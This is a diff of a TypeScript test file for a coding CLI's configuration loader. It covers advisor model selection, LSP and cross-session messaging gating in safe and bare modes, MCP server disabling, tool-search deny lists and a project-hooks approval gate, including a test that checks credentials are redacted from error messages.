-      expect(config.getGoalCheckpointTimeoutMs()).toBe(45_000);
-    });
-
-    it.each([
-      0,
-      -1,
-      1.5,
-      GOAL_CHECKPOINT_TIMEOUT_SECONDS_CAP + 1,
-      '30' as unknown as number,
-    ])('rejects invalid settings value %s at startup', async (value) => {
-      process.argv = ['node', 'script.js'];
-      const argv = await parseArguments();
-
-      await expect(
-        loadCliConfig({ model: { goalCheckpointTimeoutSeconds: value } }, argv),
-      ).rejects.toThrow(/settings\.json: model\.goalCheckpointTimeoutSeconds/);
-    });
-
-    it('uses the built-in default when the setting is unset', async () => {
-      process.argv = ['node', 'script.js'];
-      const argv = await parseArguments();
-
-      const config = await loadCliConfig({}, argv);
-
-      expect(config.getGoalCheckpointTimeoutMs()).toBe(180_000);
-    });
+        await expect(
+          loadCliConfig(
+            { model: { goalCheckpointTimeoutSeconds: value } },
+            argv,
+          ),
+        ).resolves.toBeDefined();
+      },
+    );
   });
 
   it('should use configured context file name when settings.context.fileName is set', async () => {
@@ -1542,6 +2433,112 @@ describe('loadCliConfig', () => {
     expect(config.getModelFallbacks()).toEqual(['cli-a', 'cli-b']);
   });
 
+  it('uses advisorModel from settings when --advisor is absent', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(
+      {
+        advisorModel: ' advisor-model ',
+        modelProviders: {
+          openai: [
+            {
+              id: 'advisor-model',
+              apiKey: 'test-key',
+              models: [{ id: 'advisor-model' }],
+            },
+          ],
+        },
+      },
+      argv,
+    );
+
+    expect(config.getAdvisorModel()).toBe('advisor-model');
+  });
+
+  it('lets --advisor override the persisted model for one session', async () => {
+    process.argv = ['node', 'script.js', '--advisor', 'cli-advisor'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(
+      {
+        advisorModel: 'settings-advisor',
+        modelProviders: {
+          openai: [
+            {
+              id: 'cli-advisor',
+              apiKey: 'test-key',
+              models: [{ id: 'cli-advisor' }],
+            },
+          ],
+        },
+      },
+      argv,
+    );
+
+    expect(config.getAdvisorModel()).toBe('cli-advisor');
+  });
+
+  it('lets --advisor off disable a persisted model for one session', async () => {
+    process.argv = ['node', 'script.js', '--advisor', 'off'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(
+      { advisorModel: 'settings-advisor' },
+      argv,
+    );
+
+    expect(config.getAdvisorModel()).toBeUndefined();
+  });
+
+  it('allows an Advisor matching the CLI runtime model', async () => {
+    process.argv = [
+      'node',
+      'script.js',
+      '--auth-type',
+      'openai',
+      '--model',
+      'runtime-advisor',
+      '--advisor',
+      'runtime-advisor',
+      '--openai-api-key',
+      'test-key',
+      '--openai-base-url',
+      'https://example.com/v1',
+    ];
+    const argv = await parseArguments();
+
+    const config = await loadCliConfig({}, argv);
+
+    expect(config.getAdvisorModel()).toBe('runtime-advisor');
+  });
+
+  it('rejects an unavailable persisted Advisor model', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+
+    await expect(
+      loadCliConfig({ advisorModel: 'missing-advisor' }, argv),
+    ).rejects.toThrow("Advisor model 'missing-advisor' is not configured.");
+  });
+
+  it('does not expose aux-selector credentials in the startup error', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+
+    const failure = await loadCliConfig(
+      {
+        advisorModel:
+          'openai:missing-advisor\0https://user:sk-secret@gw.example/v1',
+      },
+      argv,
+    ).catch((error: unknown) => error);
+
+    expect(failure).toBeInstanceOf(FatalConfigError);
+    expect((failure as Error).message).toContain(
+      "Advisor model 'openai:missing-advisor (https://gw.example/v1)' is not configured.",
+    );
+    expect((failure as Error).message).not.toContain('sk-secret');
+    expect((failure as Error).message).not.toContain('\0');
+  });
+
   it('should use settings fallback models when the CLI flag is absent', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
@@ -1563,6 +2560,70 @@ describe('loadCliConfig', () => {
 
     expect(config.getAgentsSettings().maxParallelAgents).toBe(2);
   });
+
+  it.each([undefined, true, false])(
+    'passes agents.defaultBackground=%s from settings to core config',
+    async (defaultBackground) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const config = await loadCliConfig(
+        { agents: { defaultBackground } },
+        argv,
+      );
+
+      expect(config.getAgentsSettings().defaultBackground).toBe(
+        defaultBackground,
+      );
+    },
+  );
+
+  it('keeps cross-session messaging on when no suppression is in force', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    // An unset key is on, so the off case has to say `false` explicitly.
+    const unset = await loadCliConfig({}, argv);
+    const enabled = await loadCliConfig(
+      { agents: { crossSessionMessaging: true } },
+      argv,
+    );
+    const disabled = await loadCliConfig(
+      { agents: { crossSessionMessaging: false } },
+      argv,
+    );
+
+    expect(isCrossSessionMessagingActive({}, unset)).toBe(true);
+    expect(
+      isCrossSessionMessagingActive(
+        { agents: { crossSessionMessaging: true } },
+        enabled,
+      ),
+    ).toBe(true);
+    expect(
+      isCrossSessionMessagingActive(
+        { agents: { crossSessionMessaging: false } },
+        disabled,
+      ),
+    ).toBe(false);
+  });
+
+  // Both suppressions rather than one: a gate that answered only for
+  // `--safe-mode` would leave `--bare` binding an inbox and publishing its
+  // socket path, in the mode documented as skipping implicit startup work.
+  it.each(['--bare', '--safe-mode'])(
+    'suppresses cross-session messaging in %s mode whatever the setting says',
+    async (flag) => {
+      process.argv = ['node', 'script.js', flag];
+      const argv = await parseArguments();
+      const settings = { agents: { crossSessionMessaging: true } };
+
+      const config = await loadCliConfig(settings, argv);
+
+      // The setting still says on: what turns messaging off is the session,
+      // which only the Config the flag already reaches can see.
+      expect(isCrossSessionMessagingEnabled(settings)).toBe(true);
+      expect(isCrossSessionMessagingActive(settings, config)).toBe(false);
+    },
+  );
 
   it('passes agents.maxParallelAgentsByModel from settings to core config', async () => {
     process.argv = ['node', 'script.js'];
@@ -2156,6 +3217,37 @@ describe('loadCliConfig', () => {
     );
   });
 
+  it.each([undefined, false, true])(
+    'passes the resolved Generated UI setting, on by default, as a runtime candidate: %s',
+    async (enabled) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      await loadCliConfig({ experimental: { generatedUi: enabled } }, argv);
+      expect(mockConfigConstructorParams).toHaveBeenCalledWith(
+        expect.objectContaining({
+          bundledGeneratedUi: expect.objectContaining({
+            enabled: enabled !== false,
+          }),
+        }),
+      );
+    },
+  );
+
+  it('does not prepare a Generated UI server for Safe mode', async () => {
+    process.argv = ['node', 'script.js', '--safe-mode'];
+    const argv = await parseArguments();
+    await loadCliConfig({ experimental: { generatedUi: true } }, argv);
+    expect(mockConfigConstructorParams).toHaveBeenCalledWith(
+      expect.objectContaining({
+        bundledGeneratedUi: {
+          enabled: true,
+          unavailableReason: 'unsupported-runtime',
+          explicit: true,
+        },
+      }),
+    );
+  });
+
   it('should keep the session writer lease disabled by default', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
@@ -2465,6 +3557,61 @@ describe('loadCliConfig', () => {
     );
   });
 
+  it.each([
+    { resume: '123e4567-e89b-42d3-a456-426614174000' },
+    { continue: true },
+  ])(
+    'rejects a Managed session before binding a legacy recorder for $resume$continue',
+    async (args) => {
+      const sessionId = '123e4567-e89b-42d3-a456-426614174000';
+      mockSessionServiceInstance.loadSession.mockResolvedValue({
+        conversation: { sessionId, messages: [] },
+      });
+      mockSessionServiceInstance.loadLastSession.mockResolvedValue({
+        conversation: { sessionId, messages: [] },
+      });
+      mockSessionServiceInstance.assertLegacySessionExecution.mockImplementation(
+        () => {
+          throw new Error('belongs to managed');
+        },
+      );
+
+      await expect(loadCliConfig({}, args as CliArgs)).rejects.toThrow(
+        'belongs to managed',
+      );
+      expect(
+        mockSessionServiceInstance.assertLegacySessionExecution,
+      ).toHaveBeenCalledWith(sessionId);
+      expect(mockConfigConstructorParams).not.toHaveBeenCalled();
+    },
+  );
+
+  it('leaves a Managed transcript to a Managed host on resume', async () => {
+    const sessionId = '123e4567-e89b-42d3-a456-426614174000';
+    mockSessionServiceInstance.loadSession.mockResolvedValue({
+      conversation: { sessionId, messages: [] },
+    });
+    mockSessionServiceInstance.assertLegacySessionExecution.mockClear();
+
+    await loadCliConfig(
+      {},
+      { resume: sessionId } as CliArgs,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { executionEngine: 'managed' },
+    );
+
+    expect(
+      mockSessionServiceInstance.assertLegacySessionExecution,
+    ).not.toHaveBeenCalled();
+    expect(mockConfigConstructorParams).toHaveBeenCalled();
+  });
+
   it('rebinds a selective restore projection to the forked session', async () => {
     const sourceSessionId = '123e4567-e89b-42d3-a456-426614174000';
     const projectionSource = vi.fn(async (sessionId: string) => ({
@@ -2563,6 +3710,48 @@ describe('loadCliConfig', () => {
           sessionId: sourceSessionId,
         }),
       }),
+    );
+  });
+
+  it.each([undefined, 'legacy'] as const)(
+    'passes the paired host engine %s to the session Config',
+    async (executionEngine) => {
+      await loadCliConfig(
+        {},
+        {} as CliArgs,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        false,
+        executionEngine ? { executionEngine } : undefined,
+      );
+
+      expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+        expect.objectContaining({ sessionExecutionEngine: executionEngine }),
+      );
+    },
+  );
+
+  it('passes the Managed engine quarantine sink to the session Config', async () => {
+    const onManagedEngineQuarantine = vi.fn();
+    await loadCliConfig(
+      {},
+      {} as CliArgs,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { onManagedEngineQuarantine },
+    );
+
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({ onManagedEngineQuarantine }),
     );
   });
 
@@ -2831,6 +4020,195 @@ describe('loadCliConfig', () => {
     expect(lspInstance).toBeDefined();
     expect(lspInstance?.discoverAndPrepare).toHaveBeenCalledTimes(1);
     expect(lspInstance?.start).toHaveBeenCalledTimes(1);
+  });
+
+  it('should initialize native LSP service from tools.lspEnabled alone', async () => {
+    // The Desktop client cannot pass `--experimental-lsp` (its daemon argv is
+    // pinned in Rust), so the setting must be a complete entrance on its own.
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(true);
+    expect(nativeLspServiceMock).toHaveBeenCalledTimes(1);
+  });
+
+  it('should keep LSP off when QWEN_CODE_DISABLE_LSP overrides the setting', async () => {
+    // Mirrors QWEN_CODE_DISABLE_WORKFLOWS: an operator off-switch must win over
+    // every other entrance, since LSP servers run with the user's permissions.
+    vi.stubEnv('QWEN_CODE_DISABLE_LSP', '1');
+    process.argv = ['node', 'script.js', '--experimental-lsp'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+    vi.unstubAllEnvs();
+  });
+
+  it('should refuse an execution sandbox when only the LSP setting opts in', async () => {
+    // The guard has to see the same answer the session gets: the setting starts
+    // the same subsystem as the flag, so a sandboxed tool runner must refuse it
+    // even when no flag was passed.
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+    const policy = {
+      workspace: path.resolve(path.sep, 'sandbox-fixture', 'workspace'),
+      installation: path.resolve('/trusted-install'),
+      state: path.resolve('/trusted-state'),
+      maskedPaths: [
+        path.resolve(path.sep, 'sandbox-fixture', 'workspace', '.env'),
+      ],
+      filesystem: 'workspace-write' as const,
+      network: 'closed' as const,
+    };
+
+    await expect(
+      loadCliConfig(
+        settings,
+        argv,
+        policy.workspace,
+        [],
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        false,
+        { shellExecutionSandbox: policy },
+      ),
+    ).rejects.toThrow(
+      /does not yet support LSP enabled through tools\.lspEnabled/,
+    );
+  });
+
+  it('should refuse an execution sandbox when the LSP flag opts in', async () => {
+    // The flag-only entrance must keep refusing and keep the short wording, so
+    // the entrance-specific message cannot degrade into naming a setting the
+    // user never touched.
+    process.argv = ['node', 'script.js', '--experimental-lsp'];
+    const argv = await parseArguments();
+    const settings: Settings = {};
+    const policy = {
+      workspace: path.resolve(path.sep, 'sandbox-fixture', 'workspace'),
+      installation: path.resolve('/trusted-install'),
+      state: path.resolve('/trusted-state'),
+      maskedPaths: [
+        path.resolve(path.sep, 'sandbox-fixture', 'workspace', '.env'),
+      ],
+      filesystem: 'workspace-write' as const,
+      network: 'closed' as const,
+    };
+
+    await expect(
+      loadCliConfig(
+        settings,
+        argv,
+        policy.workspace,
+        [],
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        false,
+        { shellExecutionSandbox: policy },
+      ),
+    ).rejects.toThrow(/does not yet support LSP, ACP/);
+  });
+
+  it('should keep LSP off when the embedding host refuses it outright', async () => {
+    // `experimentalLsp: false` cannot express a refusal because the flag parser
+    // defaults it to false, so a host-owned helper Config needs its own
+    // off-switch that outranks the user's setting.
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(
+      settings,
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { lspDisabled: true },
+    );
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+  });
+
+  it('should keep LSP off in safe mode even when the setting opts in', async () => {
+    // Safe mode distrusts ambient file-sourced state, so a standing setting
+    // must not start workspace-declared language servers there.
+    process.argv = ['node', 'script.js', '--safe-mode'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+  });
+
+  it('should keep LSP off in bare mode even when the flag opts in', async () => {
+    // Bare mode shares safe mode's distrust of workspace-declared state, so the
+    // pre-existing `!bareMode` term has to keep refusing the flag entrance.
+    process.argv = ['node', 'script.js', '--bare', '--experimental-lsp'];
+    const argv = await parseArguments();
+    const settings: Settings = {};
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+  });
+
+  it('should keep LSP off when QWEN_CODE_SAFE_MODE opts in', async () => {
+    vi.stubEnv('QWEN_CODE_SAFE_MODE', '1');
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+    vi.unstubAllEnvs();
+  });
+
+  it('should let a host refusal outrank the LSP env entrance', async () => {
+    // The refusal contract says "whatever the user's setting or the
+    // environment says"; resolving the env pair first would let a daemon-wide
+    // QWEN_CODE_ENABLE_LSP start servers in a Config that must never run them.
+    vi.stubEnv('QWEN_CODE_ENABLE_LSP', '1');
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = {};
+
+    const config = await loadCliConfig(
+      settings,
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { lspDisabled: true },
+    );
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+    vi.unstubAllEnvs();
   });
 
   it('should collect LSP status snapshots during debug-mode startup', async () => {
@@ -3123,6 +4501,39 @@ describe('loadCliConfig', () => {
         tools: { webSearch: { maxPerSession: 10 } },
       });
       expect(config.getWebSearchSettings()).toEqual({ maxPerSession: 10 });
+    });
+
+    it('lets WEB_SEARCH_ALLOWED_HOSTS override tools.webSearch.allowedHosts', async () => {
+      vi.stubEnv(
+        'WEB_SEARCH_ALLOWED_HOSTS',
+        ' gw.example.com , other.example.net ,',
+      );
+      const config = await loadWithSettings({
+        tools: { webSearch: { allowedHosts: ['settings.example.com'] } },
+      });
+      expect(config.getWebSearchSettings()?.allowedHosts).toEqual([
+        'gw.example.com',
+        'other.example.net',
+      ]);
+    });
+
+    it('falls back to tools.webSearch.allowedHosts when the env var is empty', async () => {
+      vi.stubEnv('WEB_SEARCH_ALLOWED_HOSTS', '   ');
+      const config = await loadWithSettings({
+        tools: { webSearch: { allowedHosts: ['settings.example.com'] } },
+      });
+      expect(config.getWebSearchSettings()?.allowedHosts).toEqual([
+        'settings.example.com',
+      ]);
+    });
+
+    it('passes an allowedHosts-only setting through without other web search keys', async () => {
+      const config = await loadWithSettings({
+        tools: { webSearch: { allowedHosts: ['gw.example.com'] } },
+      });
+      expect(config.getWebSearchSettings()).toEqual({
+        allowedHosts: ['gw.example.com'],
+      });
     });
 
     // Both modes must turn the tool off explicitly: leaving the settings
@@ -3518,7 +4929,7 @@ describe('mergeExcludeTools', () => {
     expect(config.getPermissionsDeny()).toHaveLength(2);
   });
 
-  it('should add tool_search to deny list when tools.toolSearch.enabled is false', async () => {
+  it('should disable both deferred-tool bridges when tools.toolSearch.enabled is false', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
     const settings: Settings = {
@@ -3526,25 +4937,28 @@ describe('mergeExcludeTools', () => {
     };
     const config = await loadCliConfig(settings, argv, undefined, []);
     expect(config.getPermissionsDeny()).toContain('tool_search');
+    expect(config.getPermissionsDeny()).toContain('tool_call');
   });
 
-  it('should auto-disable tool_search for deepseek-v4 models', async () => {
+  it('should keep the stable bridge enabled for deepseek-v4 models', async () => {
     process.argv = ['node', 'script.js', '--model', 'deepseek-v4-flash'];
     const argv = await parseArguments();
     const settings: Settings = {};
     const config = await loadCliConfig(settings, argv, undefined, []);
-    expect(config.getPermissionsDeny()).toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_call');
   });
 
-  it('should auto-disable tool_search for deepseek-v3 models', async () => {
+  it('should keep the stable bridge enabled for deepseek-v3 models', async () => {
     process.argv = ['node', 'script.js', '--model', 'deepseek-v3'];
     const argv = await parseArguments();
     const settings: Settings = {};
     const config = await loadCliConfig(settings, argv, undefined, []);
-    expect(config.getPermissionsDeny()).toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_call');
   });
 
-  it('should auto-disable tool_search for deepseek-chat models with provider prefix', async () => {
+  it('should keep the stable bridge enabled for prefixed deepseek-chat models', async () => {
     process.argv = [
       'node',
       'script.js',
@@ -3554,18 +4968,20 @@ describe('mergeExcludeTools', () => {
     const argv = await parseArguments();
     const settings: Settings = {};
     const config = await loadCliConfig(settings, argv, undefined, []);
-    expect(config.getPermissionsDeny()).toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_call');
   });
 
-  it('should not auto-disable tool_search for non-deepseek models', async () => {
+  it('should keep the stable bridge enabled for non-deepseek models', async () => {
     process.argv = ['node', 'script.js', '--model', 'qwen-max'];
     const argv = await parseArguments();
     const settings: Settings = {};
     const config = await loadCliConfig(settings, argv, undefined, []);
     expect(config.getPermissionsDeny()).not.toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_call');
   });
 
-  it('should respect explicit enabled:true override for deepseek models', async () => {
+  it('should accept explicit enabled:true for deepseek models', async () => {
     process.argv = ['node', 'script.js', '--model', 'deepseek-v4-flash'];
     const argv = await parseArguments();
     const settings: Settings = {
@@ -3573,6 +4989,7 @@ describe('mergeExcludeTools', () => {
     };
     const config = await loadCliConfig(settings, argv, undefined, []);
     expect(config.getPermissionsDeny()).not.toContain('tool_search');
+    expect(config.getPermissionsDeny()).not.toContain('tool_call');
   });
 
   it('should pass tools.toolSearch.threshold through to the config', async () => {
@@ -3585,11 +5002,11 @@ describe('mergeExcludeTools', () => {
     expect(config.getToolSearchThreshold()).toBe(25);
   });
 
-  it('should default tools.toolSearch.threshold to 10', async () => {
+  it('should default tools.toolSearch.threshold to 0', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
     const config = await loadCliConfig({}, argv, undefined, []);
-    expect(config.getToolSearchThreshold()).toBe(10);
+    expect(config.getToolSearchThreshold()).toBe(0);
   });
 
   it('should enable CodeModeOnly only when explicitly configured', async () => {
@@ -3610,19 +5027,42 @@ describe('mergeExcludeTools', () => {
     expect(codeMode.getToolMode()).toBe('code_mode_only');
   });
 
+  it('should only enable tools.freeform inside CodeModeOnly', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+
+    const direct = await loadCliConfig(
+      { tools: { freeform: true } },
+      argv,
+      undefined,
+      [],
+    );
+    const codeMode = await loadCliConfig(
+      { tools: { codeModeOnly: true, freeform: true } },
+      argv,
+      undefined,
+      [],
+    );
+
+    expect(direct.getCodeModeOnly()).toBe(false);
+    expect(direct.getFreeform()).toBe(false);
+    expect(codeMode.getFreeform()).toBe(true);
+  });
+
   it.each(['--safe-mode', '--bare'])(
-    'should disable CodeModeOnly in %s mode',
+    'should disable CodeModeOnly and Freeform in %s mode',
     async (flag) => {
       process.argv = ['node', 'script.js', flag];
       const argv = await parseArguments();
       const config = await loadCliConfig(
-        { tools: { codeModeOnly: true } },
+        { tools: { codeModeOnly: true, freeform: true } },
         argv,
         undefined,
         [],
       );
 
       expect(config.getCodeModeOnly()).toBe(false);
+      expect(config.getFreeform()).toBe(false);
     },
   );
 
@@ -4091,6 +5531,108 @@ describe('loadCliConfig with allowed-mcp-server-names', () => {
     expect(config.isMcpServerDisabled('server3')).toBe(false);
   });
 
+  it('should exclude exactly the named server via --disable-mcp-server', async () => {
+    process.argv = ['node', 'script.js', '--disable-mcp-server', 'server1'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(baseSettings, argv, undefined, []);
+    // Exclusion is a disabled-status flag, not removal from the server map —
+    // the same contract as settings.mcp.excluded above.
+    expect(config.getMcpServers()).toEqual({
+      server1: { url: 'http://localhost:8080' },
+      server2: { url: 'http://localhost:8081' },
+      server3: { url: 'http://localhost:8082' },
+    });
+    expect(config.isMcpServerDisabled('server1')).toBe(true);
+    expect(config.isMcpServerDisabled('server2')).toBe(false);
+    expect(config.isMcpServerDisabled('server3')).toBe(false);
+  });
+
+  it('should exclude multiple servers with repeated --disable-mcp-server flags', async () => {
+    process.argv = [
+      'node',
+      'script.js',
+      '--disable-mcp-server',
+      'server1',
+      '--disable-mcp-server',
+      'server2',
+    ];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(baseSettings, argv, undefined, []);
+    expect(config.isMcpServerDisabled('server1')).toBe(true);
+    expect(config.isMcpServerDisabled('server2')).toBe(true);
+    expect(config.isMcpServerDisabled('server3')).toBe(false);
+  });
+
+  it('should union --disable-mcp-server with settings mcp.excluded', async () => {
+    process.argv = ['node', 'script.js', '--disable-mcp-server', 'server2'];
+    const argv = await parseArguments();
+    const settings: Settings = {
+      ...baseSettings,
+      mcp: { excluded: ['server1'] },
+    };
+    const config = await loadCliConfig(settings, argv, undefined, []);
+    expect(config.isMcpServerDisabled('server1')).toBe(true);
+    expect(config.isMcpServerDisabled('server2')).toBe(true);
+    expect(config.isMcpServerDisabled('server3')).toBe(false);
+  });
+
+  it('should disable nothing when --disable-mcp-server is absent', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(baseSettings, argv, undefined, []);
+    expect(config.isMcpServerDisabled('server1')).toBe(false);
+    expect(config.isMcpServerDisabled('server2')).toBe(false);
+    expect(config.isMcpServerDisabled('server3')).toBe(false);
+  });
+
+  it('should apply --disable-mcp-server alongside an allow-list (allow-then-deny)', async () => {
+    process.argv = [
+      'node',
+      'script.js',
+      '--allowed-mcp-server-names',
+      'server1,server2',
+      '--disable-mcp-server',
+      'server1',
+    ];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(baseSettings, argv, undefined, []);
+    // The allow-list narrows the returned map; the disable flag still applies
+    // on top of it, so a server named by both ends up disabled.
+    expect(config.getMcpServers()).toEqual({
+      server1: { url: 'http://localhost:8080' },
+      server2: { url: 'http://localhost:8081' },
+    });
+    expect(config.isMcpServerDisabled('server1')).toBe(true);
+    expect(config.isMcpServerDisabled('server2')).toBe(false);
+  });
+
+  it('should still apply --disable-mcp-server under --safe-mode', async () => {
+    // Safe mode drops settings.mcpServers entirely (only top-tier session and
+    // `--mcp-config` servers survive), so these servers come from --mcp-config.
+    process.argv = [
+      'node',
+      'script.js',
+      '--safe-mode',
+      '--disable-mcp-server',
+      'cli-server-1',
+      '--mcp-config',
+      JSON.stringify({
+        mcpServers: {
+          'cli-server-1': { command: 'cmd-1' },
+          'cli-server-2': { command: 'cmd-2' },
+        },
+      }),
+    ];
+    const argv = await parseArguments();
+    const config = await loadCliConfig(baseSettings, argv, undefined, []);
+    expect(config.getMcpServers()).toEqual({
+      'cli-server-1': { command: 'cmd-1' },
+      'cli-server-2': { command: 'cmd-2' },
+    });
+    expect(config.isMcpServerDisabled('cli-server-1')).toBe(true);
+    expect(config.isMcpServerDisabled('cli-server-2')).toBe(false);
+  });
+
   it('should apply allowedMcpServers filter but excluded servers are still returned', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
@@ -4198,6 +5740,35 @@ describe('loadCliConfig with --mcp-config', () => {
     expect(mcpServers['direct-server']).toEqual({
       url: 'http://localhost:8080',
     });
+  });
+
+  it('should parse a config file that starts with a UTF-8 BOM', async () => {
+    // `fs` is mocked in this file, so use the untouched `fs.promises` to write
+    // a real file and widen `existsSync` for just this path.
+    const dir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'mcp-bom-'));
+    const file = path.join(dir, 'mcp.json');
+    await fs.promises.writeFile(
+      file,
+      '\uFEFF' +
+        JSON.stringify({ mcpServers: { 'bom-server': { command: 'node' } } }),
+    );
+    const originalExists = vi.mocked(fs.existsSync).getMockImplementation();
+    vi.mocked(fs.existsSync).mockImplementation(
+      (p) => p === file || Boolean(originalExists?.(p)),
+    );
+    try {
+      process.argv = ['node', 'script.js', '--mcp-config', file];
+      const argv = await parseArguments();
+      const config = await loadCliConfig({}, argv);
+      expect(config.getMcpServers()).toEqual({
+        'bom-server': { command: 'node' },
+      });
+    } finally {
+      if (originalExists) {
+        vi.mocked(fs.existsSync).mockImplementation(originalExists);
+      }
+      await fs.promises.rm(dir, { recursive: true, force: true });
+    }
   });
 
   it('should override settings file servers with same name', async () => {
@@ -4552,6 +6123,352 @@ describe('loadCliConfig with includeDirectories', () => {
     expect(NativeLspService).not.toHaveBeenCalled();
   });
 
+  describe('project hooks approval gate', () => {
+    const projectHooks = { SessionStart: [{ hooks: [] }] };
+    const cwd = path.resolve(path.sep, 'home', 'user', 'project');
+    const gateParam = () =>
+      mockConfigConstructorParams.mock.lastCall?.[0]
+        .projectHooksPendingApproval;
+
+    const lastParams = () => mockConfigConstructorParams.mock.lastCall?.[0];
+
+    beforeEach(() => {
+      vi.mocked(getProjectHooksApprovalState).mockReturnValue('pending');
+    });
+
+    it.each([
+      ['default mode', true, false, [], {}],
+      ['--yolo', false, true, ['--yolo'], {}],
+      ['--approval-mode yolo', false, true, ['--approval-mode', 'yolo'], {}],
+      ['--safe-mode', undefined, false, ['--safe-mode'], {}],
+      ['--bare', undefined, false, ['--bare'], {}],
+      ['disableAllHooks', undefined, false, [], { disableAllHooks: true }],
+      [
+        'a settings-only yolo',
+        true,
+        false,
+        [],
+        { tools: { approvalMode: 'yolo' } },
+      ],
+    ] as const)(
+      'with %s, an unapproved block gives projectHooksPendingApproval=%s',
+      async (_label, expected, yoloExempt, flags, settings) => {
+        process.argv = ['node', 'script.js', ...flags];
+        const argv = await parseArguments();
+
+        await loadCliConfig(settings as Settings, argv, cwd, undefined, {
+          projectHooks,
+        });
+
+        expect(gateParam()).toBe(expected);
+        expect(lastParams()?.projectHooksYoloExempt).toBe(yoloExempt);
+      },
+    );
+
+    const approval = {
+      root: path.resolve(path.sep, 'home', 'user', 'repo'),
+      hooks: projectHooks,
+      resolved: projectHooks,
+      env: { files: {}, settings: null },
+    };
+
+    it('asks the store about the approval the caller built', async () => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+
+      await loadCliConfig({}, argv, cwd, undefined, {
+        projectHooks,
+        projectHooksApproval: approval,
+      });
+
+      expect(vi.mocked(getProjectHooksApprovalState).mock.calls).toEqual([
+        [approval],
+      ]);
+    });
+
+    it.each([
+      ['pending', false],
+      ['rejected', true],
+      ['approved', false],
+    ] as const)(
+      'an explicitly trusted folder runs a %s block without demanding approval (pending=%s)',
+      async (state, expectedPending) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(state);
+        vi.mocked(isWorkspaceTrusted).mockReturnValue({
+          isTrusted: true,
+          source: 'file',
+        });
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig(
+          { security: { folderTrust: { enabled: true } } } as Settings,
+          argv,
+          cwd,
+          undefined,
+          { projectHooks, projectHooksApproval: approval },
+        );
+
+        // Trust is the co-equal authority: pending clears, an explicit
+        // rejection still withholds, approved stays cleared.
+        expect(gateParam()).toBe(expectedPending);
+      },
+    );
+
+    it('IDE-reported workspace trust clears the gate even with the feature off', async () => {
+      const { ideContextStore } = await import('@qwen-code/qwen-code-core');
+      const getSpy = vi.spyOn(ideContextStore, 'get').mockReturnValue({
+        workspaceState: { isTrusted: true, openFiles: [] },
+      } as never);
